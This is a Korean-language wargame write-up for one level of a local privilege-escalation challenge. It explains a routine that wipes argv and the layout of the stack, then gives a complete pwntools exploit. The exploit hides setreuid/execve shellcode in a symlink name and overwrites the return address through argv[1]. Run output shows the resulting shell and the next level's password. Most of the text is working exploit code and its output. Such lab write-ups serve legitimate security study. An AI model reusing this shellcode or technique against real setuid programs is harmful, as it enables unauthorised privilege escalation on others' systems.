# Lv9 -> Lv10
## lv10

이번 문제에서 달라진 부분은 다음과 같다.

* main + 284
```asm
   0x0804861c <+284>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x08048623 <+291>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048626 <+294>:	cmp    eax,DWORD PTR [ebp-0x30]
   0x08048629 <+297>:	jl     0x8048630 <main+304>
   0x0804862b <+299>:	jmp    0x8048670 <main+368>
   0x0804862d <+301>:	lea    esi,[esi+0x0]
   0x08048630 <+304>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048633 <+307>:	lea    edx,[eax*4+0x0]
   0x0804863a <+314>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804863d <+317>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048640 <+320>:	push   edx
   0x08048641 <+321>:	call   0x80483f0 <strlen@plt>
   0x08048646 <+326>:	add    esp,0x4
   0x08048649 <+329>:	mov    eax,eax
   0x0804864b <+331>:	push   eax
   0x0804864c <+332>:	push   0x0
   0x0804864e <+334>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048651 <+337>:	lea    edx,[eax*4+0x0]
   0x08048658 <+344>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804865b <+347>:	mov    edx,DWORD PTR [eax+edx*1]
   0x0804865e <+350>:	push   edx
   0x0804865f <+351>:	call   0x8048430 <memset@plt>
   0x08048664 <+356>:	add    esp,0xc
   0x08048667 <+359>:	inc    DWORD PTR [ebp-0x2c]
   0x0804866a <+362>:	jmp    0x8048623 <main+291>
   0x0804866c <+364>:	lea    esi,[esi+eiz*1+0x0]
```

위 루틴은 모든 argv를 0으로 지운다. argv에 쉘코드를 넣을 수는 없다. 
스택 프레임 구조를 다시 찾아봤더니 다음과 같은 내용이 나왔다.

```
----- Low Address -----

...
local variables of main
saved registers of main
return address of main
argc
argv
envp
stack from startup code
argc
argv pointers
NULL that ends argv[]
environment pointers
NULL that ends envp[]
ELF Auxiliary Table
argv strings
environment strings
program name
NULL

----- High Address -----
```

스택 최상위에 program name이 들어가있다.
이전 문제처럼 심볼릭 링크로 쉘코드를 넣어 두고 스택 최상위의 program name으로 ret을 덮어주면 가능하다.
gdb를 이용해 해당 주소를 찾아보니, 다음과 같이 프로그램의 절대주소가 저장되어 있었다.

```
pwndbg> x/10s 0xffffdf00
0xffffdf00:	"ADDRESS=unix:path=/run/user/1009/bus"
0xffffdf25:	"XDG_RUNTIME_DIR=/run/user/1009"
0xffffdf44:	"XAUTHORITY=/run/user/1000/gdm/Xauthority"
0xffffdf6d:	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"
0xffffdfcb:	"LESSOPEN=| /usr/bin/lesspipe %s"
0xffffdfeb:	"/home/lv9/aa"
0xffffdff8:	""
0xffffdff9:	""
0xffffdffa:	""
0xffffdffb:	""
pwndbg> 
```

위의 결과는 심볼릭 링크인 aa의 디버깅 결과이다. 이를 통해 심볼릭 링크가 유효함을 알 수 있었고, 다음과 같은 코드를 작성했다.

## exploit.py

```python
from pwn import *
import os

context.log_level = 'debug'

argv1 = "a"*0x2c  +  "\xc0\xdf\xff\xff"
fileName = "\x90"*20 + "\x66\xb8\xf2\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

if not os.path.exists(fileName):
    os.system('ln -s lv10 ' + fileName)

p = process(['./' + fileName, argv1])
p.recvuntil('\n')
p.sendline('id')
p.recvuntil('\n')
p.sendline('my-pass')
p.interactive()
```
------

```
lv9@ubuntu:~$ python exploit.py 
[+] Starting local process './\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90f\xb8\xf2\x03\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0P\xbe..rg\x81\xc6\x01\x01\x01\x01V\xbf.binGW\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80' argv=['./\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90f\xb8\xf2\x03\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0P\xbe..rg\x81\xc6\x01\x01\x01\x01V\xbf.binGW\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\xdf\xff\xff'] : pid 43823
[DEBUG] Received 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 61  c0 df ff ff  │aaaa│aaaa│aaaa│····│
    00000030  0a                                                  │·│
    00000031
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x2e bytes:
    'uid=1010(lv10) gid=1009(lv9) groups=1009(lv9)\n'
[DEBUG] Sent 0x8 bytes:
    'my-pass\n'
[*] Switching to interactive mode
[DEBUG] Received 0xe bytes:
    'silver bullet\n'
silver bullet
$ 
```